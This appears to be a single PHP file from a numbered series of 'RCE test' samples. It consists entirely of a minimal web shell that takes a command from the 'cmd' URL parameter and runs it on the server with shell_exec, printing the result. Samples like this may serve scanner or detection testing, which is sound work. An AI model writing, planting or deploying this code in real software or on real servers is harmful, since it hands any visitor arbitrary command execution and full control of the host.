<?php
// RCE test variation #797
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>